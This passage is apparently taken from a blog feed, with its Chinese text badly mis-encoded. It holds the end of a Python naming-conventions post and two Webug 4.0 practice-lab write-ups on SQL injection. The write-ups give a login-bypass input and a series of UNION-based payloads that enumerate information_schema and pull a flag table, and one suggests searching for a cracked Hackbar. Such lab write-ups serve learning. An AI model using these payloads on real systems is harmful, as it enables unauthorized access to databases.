æ—¶ä¸ä¼šåŒ…å«).</li><li>ç”¨åŒä¸‹åˆ’çº¿(<code>__</code>)å¼€å¤´çš„å®ä¾‹å˜é‡æˆ–æ–¹æ³•è¡¨ç¤ºç±»å†…ç§æœ‰.</li><li>å°†ç›¸å…³çš„ç±»å’Œé¡¶çº§å‡½æ•°æ”¾åœ¨åŒä¸€ä¸ªæ¨¡å—é‡Œ. ä¸åƒ Java,æ²¡å¿…è¦é™åˆ¶ä¸€ä¸ªç±»ä¸€ä¸ªæ¨¡å—.</li><li>å¯¹ç±»åä½¿ç”¨å¤§å†™å­—æ¯å¼€å¤´çš„å•è¯(å¦‚ <code>CapWords</code>, å³ Pascalé£æ ¼), ä½†æ˜¯æ¨¡å—ååº”è¯¥ç”¨å°å†™åŠ ä¸‹åˆ’çº¿çš„æ–¹å¼(å¦‚<code>lower_with_under.py</code>). å°½ç®¡å·²ç»æœ‰å¾ˆå¤šç°å­˜çš„æ¨¡å—ä½¿ç”¨ç±»ä¼¼äº<code>CapWords.py</code> è¿™æ ·çš„å‘½å, ä½†ç°åœ¨å·²ç»ä¸é¼“åŠ±è¿™æ ·åš,å› ä¸ºå¦‚æœæ¨¡å—åç¢°å·§å’Œç±»åä¸€è‡´, è¿™ä¼šè®©äººå›°æ‰°.</li></ul><h2 id="python-ä¹‹çˆ¶-guido-æ¨èçš„è§„èŒƒ">Python ä¹‹çˆ¶ Guido æ¨èçš„è§„èŒƒ</h2><table><colgroup><col style="width: 22%" /><col style="width: 17%" /><col style="width: 60%" /></colgroup><thead><tr class="header"><th>Type</th><th>Public</th><th>Internal</th></tr></thead><tbody><tr class="odd"><td>Modules</td><td><code>lower_with_under</code></td><td><code>_lower_with_under</code></td></tr><tr class="even"><td>Packages</td><td><code>lower_with_under</code></td><td>Â </td></tr><tr class="odd"><td>Classes</td><td><code>CapWords</code></td><td><code>_CapWords</code></td></tr><tr class="even"><td>Exceptions</td><td><code>CapWords</code></td><td>Â </td></tr><tr class="odd"><td>Functions</td><td><code>lower_with_under()</code></td><td><code>_lower_with_under()</code></td></tr><tr class="even"><td>Global/Class Constants</td><td><code>CAPS_WITH_UNDER</code></td><td><code>_CAPS_WITH_UNDER</code></td></tr><tr class="odd"><td>Global/Class Variables</td><td><code>lower_with_under</code></td><td><code>_lower_with_under</code></td></tr><tr class="even"><td>Instance Variables</td><td><code>lower_with_under</code></td><td><code>_lower_with_under</code> (protected) or<code>__lower_with_under</code> (private)</td></tr><tr class="odd"><td>Method Names</td><td><code>lower_with_under()</code></td><td><code>_lower_with_under()</code> (protected) or<code>__lower_with_under()</code> (private)</td></tr><tr class="even"><td>Function/Method Parameters</td><td><code>lower_with_under</code></td><td>Â </td></tr><tr class="odd"><td>Local Variables</td><td><code>lower_with_under</code></td><td></td></tr></tbody></table><h2 id="references">References</h2><blockquote><ol type="1"><li><ahref="https://medium.com/@dasagrivamanu/python-naming-conventions-the-10-points-you-should-know-149a9aa9f8c7">PythonNaming Conventions â€” The 10 Points You Should Know</a></li><li><ahref="https://zh-google-styleguide.readthedocs.io/en/latest/google-python-styleguide/python_style_rules/#id16">Pythoné£æ ¼è§„èŒƒ</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webugä¹‹ä¸‡èƒ½å¯†ç </title>
      <link href="/blog/2019/07/24/websec/sql_injection/universal_pass_of_webug/"/>
      <url>/blog/2019/07/24/websec/sql_injection/universal_pass_of_webug/</url>
      
        <content type="html"><![CDATA[<p>æš‘å‡é—²æ¥æ— äº‹ï¼Œæƒ³æ‰¾ä¸ªé¶åœºç»ƒç»ƒæ‰‹ï¼Œæ‰¾åˆ°äº† Webug 4.0 é¶åœºã€‚</p><p>ä¸‹é¢å¼€å§‹èœé¸¡ä¹‹æ—…, é¦–å…ˆ,ä»å…¥é—¨, æ³¨å…¥åˆ†ç±»ä¸‹å¼€å§‹ç»ƒä¹ .</p><h1 id="webug-é¶åœºå®‰è£…">Webug é¶åœºå®‰è£…</h1><p>æ²¡å•¥è¯´çš„ï¼Œè€é“ã€‚å»<ahref="https://github.com/wangai3176/webug4.0">Webug Github</a> ä¸‹è½½å®Œæ•´2003 è™šæ‹Ÿæœºï¼Œè‡ªå¸¦ç¯å¢ƒï¼Œç›´æ¥å¯åŠ¨ phpstudyï¼Œä¾¿å¯ä»¥æ„‰å¿«çš„ç©è€äº†ã€‚</p><p>webug ä¸­æœ‰ä¸ªä¹Œäº‘çŸ¥è¯†åº“,è™šæ‹Ÿæœºä¸­å¥½åƒæ²¡æœ‰è‡ªå¸¦,éœ€è¦æˆ‘ä»¬å»ä¸‹è½½.</p><p><ahref="https://github.com/S0urceC0der/wooyun-drop-fork"><strong>wooyun-drop-fork</strong></a></p><p>ä¸‹ä¸€ä¸ªå‹ç¼©åŒ…, è§£å‹åæŠŠé‡Œé¢çš„ drop æ–‡ä»¶å¤¹æ”¾åˆ° C:ä¸‹é¢å°±å¥½äº†.</p><p><strong>æ³¨æ„ï¼š</strong>è¯·åŠ¡å¿…åœ¨ phpstudy åˆ‡æ¢ç‰ˆæœ¬é‚£é‡Œå°†ç¯å¢ƒåˆ‡æ¢è‡³PHP-5.3.29-nts +Apacheã€‚(å¦åˆ™ç­‰ä½ å¯¹ç€æ³¨å…¥å…¥é—¨é¢˜ï¼Œæ­»æ´»æ³¨å…¥ä¸æˆåŠŸï¼ŒæŸ¥ä¸€ä¸‹æ•°æ®åº“æ—¥å¿—ï¼Œæ‰å‘ç°é»˜è®¤ç‰ˆæœ¬å¯¹ä½ çš„å•å¼•å·åšäº†è½¬ä¹‰æ—¶ï¼Œå°±çŸ¥é“ä»€ä¹ˆæ˜¯ç»æœ›äº†ã€‚)</p><p>ç„¶åï¼Œä¸»æœºè®¿é—®è™šæ‹Ÿæœº IP å³å¯ã€‚ç”¨æˆ·åä¸å¯†ç éƒ½æ˜¯ adminï¼ŒæˆåŠŸè¿›å…¥ã€‚</p><p>åœ¨å®æˆ˜ä¹‹å‰ï¼Œå…ˆåœ¨ Chrome ä¸Šæ•´ä¸ªHackbarï¼Œç°åœ¨æ”¶è´¹äº†ï¼Œå¤§å®¶è¦æ”¯æŒæ­£ç‰ˆå‘€ã€‚ï¼ˆæˆ‘çœ‹è§ç¾åˆ€å°±æ„Ÿè§‰è´µäº†ã€‚äºæ˜¯ï¼Œæ±‚åŠ©å¹¿å¤§ç½‘å‹ï¼ŒGoogleå…³é”®å­—ï¼šhackbar ç ´è§£æ•™ç¨‹ï¼‰</p><p>sql æ³¨å…¥ä½¿ç”¨ hackbar ä¼šå¾ˆæ–¹ä¾¿</p><ol type="1"><li>load URL å°†å½“å‰ URL åŠ è½½åˆ° hackbarï¼Œå¯ä»¥ä½¿ç”¨ Encoding ä¸­çš„ URLencode ä¸ URL decode è¿›è¡Œç¼–ç æˆ–è§£ç </li><li>split URL å°†ç›®å½•ä¸æŸ¥è¯¢è¯­å¥åˆ†å¼€ï¼Œä¾¿äºæ›´æ”¹ï¼Œè€Œä¸” hackbar ä¸­çš„ URLä¸ä¼šè¢«è½¬ä¹‰ã€‚</li><li>å½“é‡åˆ°ç™»é™†æ¡†æ³¨å…¥ç­‰ post è¯·æ±‚æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ Post data è‡ªå·±å†™ postæ•°æ®ï¼Œé¿å…åœ°å€æ è½¬ä¹‰ï¼Œä¸€æ¬¡æ¬¡æ”¹éº»çƒ¦è¿˜çœ¼èŠ±ã€‚</li></ol><p>ä¸‹é¢æ¥ä¸€ä¸ªä¸‡èƒ½å¯†ç ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦çŸ¥é“ç™»å½•è¿™ç§ä¸œè¥¿ï¼Œå¿…ç„¶æ˜¯ä½¿ç”¨ postæäº¤çš„ï¼Œæ‰€ä»¥å³é”®æŸ¥çœ‹ç½‘é¡µæºç ï¼Œæ‰¾åˆ°ç”¨æˆ·åä¸å¯†ç çš„ä¸¤ä¸ªå­—æ®µï¼Œusernameã€passwordã€‚</p><p>çŒœæµ‹å¤§è‡´ sql è¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> user where name=<span class="variable">$name</span> <span class="keyword">and</span> passwd=<span class="variable">$passwd</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡åˆ¤æ–­æŸ¥è¯¢ç»“æœæ˜¯å¦å­˜åœ¨ï¼ˆå¤§äº 1 æ¡è®°å½•ï¼‰æ¥åˆ¤æ–­æ˜¯å¦æ­£ç¡®ã€‚</p><p>å½“ç„¶ï¼Œä¸€èˆ¬ <span class="math inline">\(passwd æ˜¯ md5åŠ å¯†åçš„æ•°æ®ã€‚æ¯”å¦‚ï¼š\)</span>passwd = md5($_POST['passwd']);</p><p>ä¸‹é¢ï¼ŒF12 ä¸Š hackbar å‹¾é€‰ Post dataï¼Œç„¶åè¾“å…¥username=ä½ è¦è¾“å…¥çš„ç”¨æˆ·å&amp;password=ä½ è¦è¾“å…¥çš„å¯†ç </p><p>è¿™é‡Œä¸¾ä¸ªä¾‹å­ï¼šusername=admin'#&amp;password=dewc ç„¶å Exxcute flagå‡ºç°ã€‚</p><p>ä¸¤ç§æ³¨é‡Šæ–¹å¼ï¼š#ä¸--[ç©ºæ ¼] (æ³¨: è¿™é‡Œæ˜¯ä¸¤ä¸ªæ¨ªçº¿)</p><p>è¿™ä¸ªå¾ˆç®€å•å•¦ã€‚çŒœæµ‹å­˜åœ¨ç”¨æˆ·åadminï¼Œç„¶åç”¨å•å¼•å·é—­åˆï¼Œåœ¨æ³¨é‡Šä¸€ä¸‹ï¼Œåé¢çš„å¯†ç å­—æ®µã€‚å³: admin' #</p><p>å¯†ç ä»€ä¹ˆä¹Ÿä¸è¾“å…¥ï¼Œç„¶åç™»å½•ï¼Œæ³¨å…¥å¤±è´¥ã€‚ã€‚</p><p>ç„¶åå‘ç°ï¼Œè¦éšä¾¿è¾“ç‚¹å¯†ç ã€‚(æˆ‘æ˜¯ä¸ä¼šå‘Šè¯‰ä½ ï¼Œæˆ‘çœ‹äº†æºç çš„)ã€‚æˆåŠŸã€‚</p><p>æ€»ç»“ï¼š</p><ol type="1"><li>hackbar ä¸æ„§æ˜¯ä¸ªäººäººç§°èµçš„åˆ©å™¨ã€‚</li><li>æ³¨æ„ä¸­è‹±æ–‡å­—ç¬¦</li><li>ä¸€èˆ¬ä½ è¾“å…¥çš„æ•°æ®åœ¨ sql è¯­å¥ä¸­é—´ï¼Œå¾€å¾€åé¢è¿˜æœ‰è¯­å¥ï¼Œå…»æˆåŠ #æˆ–--æ³¨é‡Šçš„ä¹ æƒ¯ã€‚</li><li>ç»•è¿‡ç™»å½•æ—¶ï¼Œå¯†ç æ€»è¿˜æ˜¯è¦è¾“å…¥ç‚¹ä¸œè¥¿ï¼Œï¼ˆæˆ‘çœ‹æºç ï¼Œåˆ¤æ–­ç”¨æˆ·åéç©ºä¸”å¯†ç éç©ºåï¼Œæ‰ä¼šè¿›è¡Œåç»­æ“ä½œï¼‰</li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ul><li>webug é¶åœºæºç </li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webugä¹‹æ˜¾é”™æ³¨å…¥</title>
      <link href="/blog/2019/07/24/websec/sql_injection/basic_sql_injection_of_webug/"/>
      <url>/blog/2019/07/24/websec/sql_injection/basic_sql_injection_of_webug/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†</h1><h2 id="mysql-æ³¨é‡Š">mysql æ³¨é‡Š</h2><p>mysql æ³¨é‡Šç¬¦æœ‰ä¸‰ç§ï¼š</p><ol type="1"><li><p>#...</p></li><li><p>"-- ..."</p></li><li><p>/*...*/</p></li></ol><h2 id="mysql-å¸¸ç”¨å‡½æ•°">mysql å¸¸ç”¨å‡½æ•°</h2><p>user() å½“å‰ç™»é™†æ•°æ®åº“çš„ç”¨æˆ·ã€version() mysql çš„ç‰ˆæœ¬ã€database()å½“å‰æ•°æ®åº“ã€@<span class="citation" data-cites="datadir">@datadir</span>æ•°æ®åº“çš„è·¯å¾„ã€@<span class="citation"data-cites="version_compile_os">@version_compile_os</span>æ“ä½œç³»ç»Ÿç‰ˆæœ¬</p><p>@<span class="citation" data-cites="version">@version</span> å’Œversion() ä¸€æ ·ä¹Ÿæ˜¯ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><ol type="1"><li>concat(str1,str2,...)â€”â€”æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</li><li>concat_ws(separator,str1,str2,...)â€”â€”å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</li><li>group_concat(str1,str2,...)â€”â€”è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®</li></ol><p><a href="https://my.oschina.net/MiniBu/blog/478342">MySQLè¿æ¥å­—ç¬¦ä¸²å‡½æ•° CONCATï¼ŒCONCAT_WSï¼ŒGROUP_CONCAT ä½¿ç”¨æ€»ç»“</a></p><p>UNION æ“ä½œç¬¦ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥çš„ç»“æœé›†ã€‚</p><p>è¯·æ³¨æ„ï¼ŒUNION å†…éƒ¨çš„æ¯ä¸ª SELECTè¯­å¥å¿…é¡»æ‹¥æœ‰ç›¸åŒæ•°é‡çš„åˆ—ã€‚åˆ—ä¹Ÿå¿…é¡»æ‹¥æœ‰ç›¸ä¼¼çš„æ•°æ®ç±»å‹ã€‚åŒæ—¶ï¼Œæ¯ä¸ª SELECTè¯­å¥ä¸­çš„åˆ—çš„é¡ºåºå¿…é¡»ç›¸åŒã€‚</p><p><strong>order by æ•°å­—, é¦–å…ˆè¿™ä¸ªæ•°å­—ä¸€å®šåœ¨ 1-(selectæŸ¥è¯¢çš„åˆ—çš„ä¸ªæ•°)ä¹‹é—´, æ•°å­—æ˜¯æŒ‡æŒ‰ç…§ä½ å‰é¢ select çš„åˆ—çš„é¡ºåº, ä» 1å¼€å§‹æ’å·, ä½ å†™å‡ ,å¯¹åº”å‡ å·,ä¹Ÿå°±æ˜¯å“ªä¸ªå­—æ®µ. æ‰€ä»¥ order byçŒœå‡ºçš„å­—æ®µæ•°,åªæ˜¯å¯¹åº” sql æŸ¥è¯¢è¯­å¥ä¸­ selectçš„å­—æ®µæ•°,å¹¶ä¸ä¸€å®šæ˜¯è¡¨çš„æ‰€æœ‰å­—æ®µ. é™¤éæŸ¥è¯¢è¯­å¥ä½¿ç”¨çš„ select *,è€Œè¿™ç§æƒ…å†µå¾ˆå¸¸è§, æ‰€ä»¥ç½‘ä¸Šå¾ˆå¤šäº’ç›¸æŠ„è¢­çš„èµ„æ–™,å°±éƒ½è¯´æˆäº†çŒœè§£è¡¨çš„å­—æ®µ.æˆ‘è®¤ä¸ºçŸ¥é“å…¶ä¸­çš„åŒºåˆ«è¿˜æ˜¯å¾ˆæœ‰å¿…è¦çš„. </strong></p><p>ä»¥ä¸ŠçŸ¥è¯†è‚¯å®šä¸å¤Ÿ, é‡åˆ°ä¸€äº›ç»†èŠ‚æ€§çš„,ä¸æ¸…æ¥šçš„å°±å»å®éªŒ,å®åœ¨ä¸è¡Œè°·æ­Œ.</p><h1 id="æ˜¾é”™æ³¨å…¥">æ˜¾é”™æ³¨å…¥</h1><p>æ³¨æ„ï¼šä¸‡èƒ½å¯†ç ä¸­åœ¨ç”¨æˆ·åé‚£é‡Œè¾“å…¥æ³¨é‡Šå¯ä»¥è¾“å…¥ --[ç©ºæ ¼] æˆ– #ï¼Œå³ï¼šçœŸå®çš„ MySQL æ³¨é‡Šå³å¯ï¼Œä½†æ˜¯åœ¨ URL åœ°å€æ è¦æ³¨æ„å­—ç¬¦ä¼šç»è¿‡ URLç¼–ç ï¼Œæ‰€ä»¥ï¼Œä½ ç›´æ¥è¾“å…¥ --[ç©ºæ ¼] æˆ– # æ˜¯ä¸ç®¡ç”¨çš„ï¼Œä½ åº”è¯¥è¾“å…¥ä»–ä»¬å¯¹åº”çš„URL ç¼–ç ã€‚</p><table><thead><tr class="header"><th>åŸæ³¨é‡Š</th><th>URL ç¼–ç </th></tr></thead><tbody><tr class="odd"><td>--[ç©ºæ ¼]</td><td>--%20 æˆ–è€…--+</td></tr><tr class="even"><td>#</td><td>%23</td></tr></tbody></table><p>è‡³äº --+ ä¸ºå•¥æ˜¯--[ç©ºæ ¼] çš„ URL ç¼–ç ï¼Œå’±ä¹Ÿä¸çŸ¥é“å‘€ï¼Œå¤§å®¶éƒ½è¿™æ ·ç”¨ã€‚</p><p>å¦‚æœä¸€å¼€å§‹è®°ä¸ä½çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ Hackbar çš„ SQL ä¸‹æ‹‰èœå•ä¸­çš„ URLencodeï¼Œå¯¹ä½ å†™çš„#æˆ–--[ç©ºæ ¼]è¿›è¡Œç¼–ç ã€‚</p><h2 id="æ£€æµ‹æ³¨å…¥ç‚¹åŠæ³¨å…¥ç±»å‹">æ£€æµ‹æ³¨å…¥ç‚¹åŠæ³¨å…¥ç±»å‹</h2><p>åŠ ä¸€ä¸ªå•å¼•å·æŠ¥é”™ï¼Œæ ¹æ®æŠ¥é”™è¯­å¥ï¼Œå†åŠ ä¸ªæ³¨é‡Šï¼Œä¸Šé¢è¡¨æ ¼ä¸­ä¸‰ç§ URLç¼–ç éƒ½å¯ä»¥ï¼Œç„¶åé¡µé¢å›æ˜¾æ­£å¸¸ï¼Œä»£è¡¨æ³¨å…¥æ­£ç¡®, è€Œä¸”æ˜¯å­—ç¬¦æ³¨å…¥,å³:phpä¸­æ•°æ®åº“è¯­å¥çš„ id å¤„æ˜¯: id = 'è¾“å…¥'</p><p>payload 1ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; --%20</span></span><br></pre></td></tr></table></figure><h2 id="çŒœè¡¨çš„å­—æ®µæ•°">çŒœè¡¨çš„å­—æ®µæ•°</h2><p>ä¸‹é¢å†åœ¨ä¸Šé¢çš„åŸºç¡€ä¸Šï¼Œä½¿ç”¨ order by çŒœå­—æ®µ,<strong>è¿™é‡ŒçŒœçš„å­—æ®µæ•°æ˜¯å‰é¢å¼€å‘è€…å¯¹ id è¿™ä¸ª sqlæŸ¥è¯¢è¯­å¥ä¸­ä½¿ç”¨çš„å­—æ®µæ•°.</strong> å› ä¸ºä¸€èˆ¬è¯¥ sql è¯­å¥éƒ½æ˜¯ä½¿ç”¨ select *æŸ¥è¯¢, æ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹,ä½ çŒœå‡ºçš„è¿™ä¸ªæŸ¥è¯¢è¯­å¥çš„å­—æ®µæ•°,ä¹Ÿå°±æ˜¯è¡¨çš„å­—æ®µæ•°.</p><p>äºŒåˆ†æ³• order by 10 å›æ˜¾é”™è¯¯ã€ order by 5 å›æ˜¾é”™è¯¯ã€order by 3å›æ˜¾é”™è¯¯ã€order by 2 å›æ˜¾æ­£å¸¸ï¼Œä»£è¡¨æœ‰ä¸¤ä¸ªå­—æ®µã€‚</p><h2 id="ç¡®å®šæ˜¾ç¤ºä½">ç¡®å®šæ˜¾ç¤ºä½</h2><p>ä¸‹é¢æ‰¾å®ƒçš„æ˜¾ç¤ºä½ï¼ˆæ˜¾ç¤ºä½æŒ‡çš„æ˜¯ç½‘é¡µä¸­èƒ½å¤Ÿæ˜¾ç¤ºæ•°æ®çš„ä½ç½®ï¼Œè¿™æ ·æ‰èƒ½åˆ©ç”¨sqlè¯­å¥å°†æ•æ„Ÿä¿¡æ¯æ˜¾ç¤ºç»™å’±çœ‹å‘€ï¼Œæœ‰çš„å­—æ®µä¸æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šï¼Œé¬¼çŸ¥é“æ˜¯å•¥å‘€ï¼‰ã€‚</p><p>ä¸‹é¢è®© id = -1æ˜¯ä¸ºäº†è®©å‰é¢çš„æŸ¥è¯¢ç»“æœä¸ºç©ºï¼Œè®©å®ƒæŸ¥ä¸å‡ºæ•°æ®æ¥ï¼Œä¸å ç”¨æ˜¾ç¤ºä½ï¼Œè¿™æ ·åé¢å’±ä»¬ä½¿ç”¨union select æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®æ‰èƒ½æ˜¾ç¤ºå‡ºæ¥</p><p>payload 2ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,2 --+</span></span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œçœ‹çœ‹é¡µé¢ä¸Šå“ªé‡Œæœ‰ 1 æˆ–è€…2ï¼Œå°±çŸ¥é“å“ªä¸ªå­—æ®µæ˜¯æ˜¾ç¤ºä½ï¼Œæ˜¾ç¤ºä½åœ¨é‚£ä¸ªä½ç½®ã€‚</p><p>è¿™é‡Œçš„è¯ï¼Œç¬¬äºŒä¸ªå­—æ®µæ˜¯æ˜¾ç¤ºä½ï¼Œäºæ˜¯æ ¹æ® MySQLå¸¸ç”¨å‡½æ•°æ„é€ å¦‚ä¸‹è¯­å¥ï¼š</p><p>payload 3:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT version(), concat_ws(&#x27;</span>, <span class="string">&#x27;, user(), version(), database(), @@datadir, @@version_compile_os) --+</span></span><br></pre></td></tr></table></figure><p>äº‹å·²è‡³æ­¤, ç„¶å¹¶è½¯, æˆ‘çš„ flag å‘¢.emm..</p><h2 id="çˆ†è¡¨">çˆ†è¡¨</h2><p>çˆ†è¡¨, Why? ä¸ºä»€ä¹ˆè¦å…ˆçˆ†è¡¨, ä¸å…ˆçˆ†åº“å‘¢?è¿™é‡Œæˆ‘ä»¬è¦çŸ¥é“æˆ‘ä»¬ä½¿ç”¨çš„é¶åœº,é¶åœºä½œä¸ºä¸€ä¸ªåº“,ä½ è§‰å¾—å®ƒèƒ½æŠŠè‡ªå·±çš„ flagæ”¾åˆ°åˆ«çš„åº“é‡Œå—? å¾ˆå¤šæ—¶å€™, å…ˆå¹²ä»€ä¹ˆ, åå¹²ä»€ä¹ˆ,éƒ½æ˜¯æœ‰ä¸€å®šçš„é€»è¾‘åœ¨çš„,å³ä½¿æ˜¯ç»éªŒ, ä¹Ÿæœ‰ä¸ºä»€ä¹ˆè¿™ä¹ˆåšçš„åŸå› ?å¸Œæœ›ä½ åœ¨å­¦ä¹ çš„æ—¶å€™,å¤šé—®é—®è‡ªå·±ä¸ºä»€ä¹ˆè¿™æ ·åš?</p><p>è¿™é‡Œå°±éœ€è¦è¡¥å……ä¸€ç‚¹çŸ¥è¯†äº†, <ahref="https://blog.csdn.net/qq_33326449/article/details/80405284">mysqlä¸­ information_schema.tables å­—æ®µè¯´æ˜</a>, é¦–å…ˆä½ è¦å¯¹ mysql æ•°æ®åº“å…ƒæ•°æ®meta çš„å­˜æ”¾ä½ç½®æœ‰ä¸€å®šçš„æŒæ¡.</p><p>information_schema åº“å­˜æ”¾ç€ mysql æ•°æ®çš„å…ƒæ•°æ®. å…¶ä¸­ tablesè¡¨ä¸­å­˜æ”¾ç€åº“å, è¡¨å,è¡¨ç±»å‹ç­‰ä¿¡æ¯. table_schema å­—æ®µå­˜æ”¾ç€æ‰€æœ‰çš„æ•°æ®åº“å,table_name å­˜æ”¾ç€æ‰€æœ‰çš„è¡¨å.</p><p>é¦–å…ˆä»ä¸Šé¢ç¡®å®šæ˜¾ç¤ºä½ä¸­æ„é€ çš„ payload4 è¿”å›çš„æ•°æ®å¾—çŸ¥, å½“å‰ä½¿ç”¨çš„æ˜¯webug æ•°æ®åº“. ç„¶åæ„é€ ä¸‹é¢ payload åˆ—å‡º webug åº“ä¸­çš„è¡¨å</p><p>payload 4:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT 1, concat(table_name,&#x27;</span> , <span class="string">&#x27;) from information_schema.tables where table_schema = &#x27;</span>webug<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹è¿”å›çš„æ•°æ®, æˆ‘çš„ flag å‡ºç°äº†, ç„¶è€Œæ€ä¹ˆè®©å®ƒæ˜¾ç¤ºå‡ºæ¥äº†åˆæ˜¯ä¸ªé—®é¢˜.</p><p>é¦–å…ˆ, ä¸è¦å¿˜è®°å®ƒæ˜¯å¼ è¡¨,ç„¶å, æ¥ç€<strong>order byçŒœå­—æ®µæ•°</strong></p><p>è¿™é‡ŒçŒœè§£å­—æ®µæ•°ä¹Ÿæ˜¯ä¸ªé—®é¢˜.</p><p><a href="https://nosec.org/home/detail/2245.html">å¦‚ä½•åœ¨ä¸çŸ¥é“ MySQLåˆ—åçš„æƒ…å†µä¸‹æ³¨å…¥å‡ºæ•°æ®ï¼Ÿ</a></p><p>ç›®å‰,æˆ‘ä»è¿™ç¯‡æ–‡ç« é‡Œå¾—åˆ°å¯å‘,å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ payload,é€šè¿‡é€æ­¥é€’å¢æ‹¬å·å†…çš„ select çš„æ•°, æ¯”å¦‚:select 1 union.. select 1,2union..., å•¥æ—¶å€™ä¸æŠ¥é”™äº†, ä¾¿æ˜¯å­—æ®µæ•°. (ä¸€èˆ¬å­—æ®µæ•°æœ€å¤šä¹Ÿå°± 10 æ¥ä¸ªå§,è¦æ˜¯æœ‰ç¨‹åºå‘˜å»ºä¸€å¼ è¡¨ç”¨ä¸ª 50/60 å¤šä¸ªå­—æ®µ,æˆ‘çœ‹ä»–è¯¥è¢«æ‹¿æ¥ç¥­å¤©äº†! )</p><p>payload 5:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT 1,2 from (select 1,2 union select * from webug.flag)tabl --+</span></span><br></pre></td></tr></table></figure><p>æ‰å‡ºæ¥å­—æ®µæ•°,ä¸º 2 . è¿™å°±å·§äº†, ç³»ç»Ÿ id é‚£ä¸ªè¯­å¥å°±æ˜¯ä¸¤ä¸ªå­—æ®µ.è¿™ä¸ç¦è®©äººæƒ³å…¥éé: ç¬¬ä¸€ä¸ªå­—æ®µä¸æ˜¾ç¤º,åªæœ‰ç¬¬äºŒä¸ªå­—æ®µæ˜¾ç¤º, ä½œä¸ºå…¥é—¨,ä¸ä¼šå¤ªå‘,åº”è¯¥ç¬¬äºŒä¸ªå­—æ®µ, å°±æ˜¯ flag çš„å†…å®¹, äºæ˜¯æŠ•æœºå–å·§çš„ payloadä¾¿äº§ç”Ÿäº†.(æ³¨: mysql æ”¯æŒè·¨è¡¨è”åˆæŸ¥è¯¢)</p><p>payload 6:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT * from webug.flag --+</span></span><br></pre></td></tr></table></figure><p>ç„¶å flag å°±å‡ºæ¥äº†,ä½œä¸ºä¸€é“å…¥é—¨é¢˜, ç°åœ¨å®ƒå·²ç»å®Œæˆäº†è‡ªå·±çš„ä½¿å‘½.</p><h2 id="æ€è€ƒ">æ€è€ƒ</h2><p>ä½œä¸ºè¦æ·±å…¥ç†è§£æŒæ¡ mysql çš„äºº, æˆ‘ä»¬ä¸ç¦æ€è€ƒ,ä¸‡ä¸€å­—æ®µæ•°ä¸æ˜¯ä¸¤ä¸ª,è¯¥æ€ä¹ˆåŠå‘¢?</p><p>æ€è·¯å¾ˆå®¹æ˜“å°±æœ‰äº†: åªæœ‰ä¸€ä¸ªæ˜¾ç¤ºä½, é‚£å¯ä»¥ä½¿ç”¨åœ¨ select æ—¶, ä½¿ç”¨ concatå‡½æ•°å°†å­—æ®µä»¬éƒ½é›†ä¸­åœ¨ç¬¬äºŒä¸ªå­—æ®µä¸Šæ˜¾ç¤º.</p><p>æ ¹æ®ä»¥ä¸ŠçŸ¥è¯†, æ„é€  payload</p><p>payload 7:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT 1, concat_ws(&#x27;</span>$<span class="string">&#x27;,`1`,`2`)  from (select 1,2 union select * from webug.flag)tabl --+</span></span><br></pre></td></tr></table></figure><p>æ˜¾ç¤ºä½æ˜¾ç¤º: 1$21$dfafdasfafdsadfa</p><p>åˆšå¼€å§‹æˆ‘è¿˜çº³é—·æ€ä¹ˆä¸¤ä¸ª$, åæ¥æ‰æƒ³èµ·æ¥,è¿™æ˜¯ä¸¤æ¡è®°å½•.ä¸‹é¢çš„è¡¨æ ¼æ˜¯ä»¥ä¸‹è¯­å¥çš„æŸ¥è¯¢ç»“æœé›†.å…¶ä¸­ç¬¬ä¸€è¡Œæ˜¯è¡¨å,å…±ä¸¤æ¡è®°å½•.(å› 